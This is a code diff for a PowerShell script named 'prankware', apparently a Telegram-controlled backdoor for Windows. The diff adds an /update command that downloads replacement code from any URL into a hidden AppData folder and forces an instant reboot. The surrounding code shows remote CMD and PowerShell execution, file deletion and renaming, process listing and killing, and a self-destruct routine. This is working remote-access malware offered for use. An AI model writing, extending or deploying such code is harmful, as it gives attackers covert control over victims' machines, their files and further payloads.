@@ -479,6 +479,29 @@ function Kill-ProcessByName {
     }
 }
 
+function Update-Script {
+    param (
+        [string]$chatId,
+        [string]$updateUrl
+    )
+    
+    try {
+        Send-TelegramMessage -chatId $chatId -message "Starting update from: $updateUrl"
+        
+        # Download new script directly to appdata location, overwriting the old one
+        $hiddenScriptPath = "$env:APPDATA\Microsoft\Windows\prankware.ps1"
+        Invoke-WebRequest -Uri $updateUrl -OutFile $hiddenScriptPath
+        
+        Send-TelegramMessage -chatId $chatId -message "Update complete. Restarting system now..."
+        
+        # Restart system immediately using shutdown command
+        shutdown /r /t 0
+        
+    } catch {
+        Send-TelegramMessage -chatId $chatId -message "Update failed: $_"
+    }
+}
+
 function Send-HelpMessage {
     param ([string]$chatId)
     $helpMessage = @"
@@ -526,6 +549,7 @@ COMMAND EXECUTION
 ------------------------------------------------------
 /cmd <command>         Execute CMD command
 /powershell <command>  Execute PowerShell command
+/update <url>           Updates the script from a URL and restarts
 
 ======================================================
 "@
@@ -602,7 +626,7 @@ function Start-NetworkMonitor {
         $timer.Start()
     } catch {}
 }
-
+# --- ONLINE/OFFLINE NOTIFIER END ---
 
 $botToken = "urbot"
 $userId = "urid"
@@ -611,8 +635,10 @@ $lastUpdateId = 0 # Initial default
 
 
 try {
+    # Ensure modern TLS
     try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls } catch {}
 
+    # Track resume-from-sleep events
     $global:JustResumed = $false
     try {
         Add-Type -AssemblyName System.Windows.Forms | Out-Null
@@ -649,6 +675,7 @@ try {
 
 Send-TelegramMessage -chatId $userId -message "System is running on PC: $(Get-PCName)"
 
+# Start monitoring network state transitions
 Start-NetworkMonitor
 
 $scriptPath = $MyInvocation.MyCommand.Path
@@ -695,6 +722,7 @@ while ($true) {
 
 
 
+            # Ensure CurrentDirectory is always initialized at the start of the loop
             if (-not $global:CurrentDirectory -or $global:CurrentDirectory -eq "") {
                 $global:CurrentDirectory = (Get-Location).Path
             }
@@ -730,25 +758,44 @@ while ($true) {
                 $reply = "Current directory: $global:CurrentDirectory"
             }
             elseif ($text -match "^(ls|dir)$") {
-                if (-not $global:CurrentDirectory -or $global:CurrentDirectory -eq "") {
+                # Ensure we have a valid current directory
+                if (-not $global:CurrentDirectory -or $global:CurrentDirectory -eq "" -or -not (Test-Path $global:CurrentDirectory)) {
                     $global:CurrentDirectory = (Get-Location).Path
                 }
+                
                 try {
-                    $items = Get-ChildItem -Path $global:CurrentDirectory -Force
-                    $reply = if ($items) {
-                        $list = foreach ($item in $items) {
-                            if ($item.PSIsContainer) {
-                                "[Folder] $($item.Name)"
-                            } else {
-                                "[File]   $($item.Name)"
-                            }
-                        }
-                        "Files and folders in $global:CurrentDirectory:`n" + ($list -join "`n")
+                    # Check if directory exists and is accessible
+                    if (-not (Test-Path $global:CurrentDirectory -PathType Container)) {
+                        $reply = "Directory '$global:CurrentDirectory' does not exist or is not accessible."
                     } else {
-                        "No files or folders found in $global:CurrentDirectory"
+                        # Use ErrorAction Stop to catch all errors
+                        $items = @(Get-ChildItem -Path $global:CurrentDirectory -Force -ErrorAction Stop)
+                        
+                        if ($items.Count -gt 0) {
+                            $list = foreach ($item in $items) {
+                                $type = if ($item.PSIsContainer) { "[Folder]" } else { "[File]  " }
+                                $size = if (-not $item.PSIsContainer) { 
+                                    " ({0:N0} bytes)" -f $item.Length 
+                                } else { 
+                                    "" 
+                                }
+                                "$type $($item.Name)$size"
+                            }
+                            $reply = "Files and folders in '$global:CurrentDirectory' ($($items.Count) items):`n" + ($list -join "`n")
+                        } else {
+                            $reply = "Directory '$global:CurrentDirectory' is empty."
+                        }
                     }
+                } catch [System.UnauthorizedAccessException] {
+                    $reply = "Access denied to directory '$global:CurrentDirectory'. You may need elevated permissions."
+                } catch [System.IO.DirectoryNotFoundException] {
+                    $reply = "Directory '$global:CurrentDirectory' was not found."
+                    # Reset to current location
+                    $global:CurrentDirectory = (Get-Location).Path
                 } catch {
-                    $reply = "Error reading directory: $_"
+                    $reply = "Error reading directory '$global:CurrentDirectory': $($_.Exception.Message)"
+                    Write-Host "Debug: Exception type: $($_.Exception.GetType().Name)" -ForegroundColor Yellow
+                    Write-Host "Debug: Full error: $_" -ForegroundColor Yellow
                 }
             }
             elseif ($text -eq "/help") {
@@ -839,6 +886,7 @@ while ($true) {
                 Invoke-SelfDestruct -chatId $chatId
                 continue
             }
+            # New file operation commands
             elseif ($text -match "^/delete\s+(.+)$") {
                 $path = $matches[1].Trim('"')
                 $reply = Remove-FileOrFolder -chatId $chatId -path $path
@@ -848,8 +896,6 @@ while ($true) {
                 $newPath = $matches[2].Trim('"')
                 $reply = Rename-FileOrFolder -chatId $chatId -oldPath $oldPath -newPath $newPath
             }
-
-
             elseif ($text -eq "/processes") {
                 $reply = Get-RunningProcesses
             }
@@ -877,6 +923,11 @@ while ($true) {
                 $Command = $text -replace "^/powershell\s*", ""
                 $Result  = Run-LocalCommand $Command "powershell"
                 Send-TgMessage $chatId "PS> $Command`n`n$Result"
+                continue
+            }
+            elseif ($text -match "^/update\s+(.+)$") {
+                $updateUrl = $matches[1].Trim()
+                Update-Script -chatId $chatId -updateUrl $updateUrl
                 continue
             }
 			else {
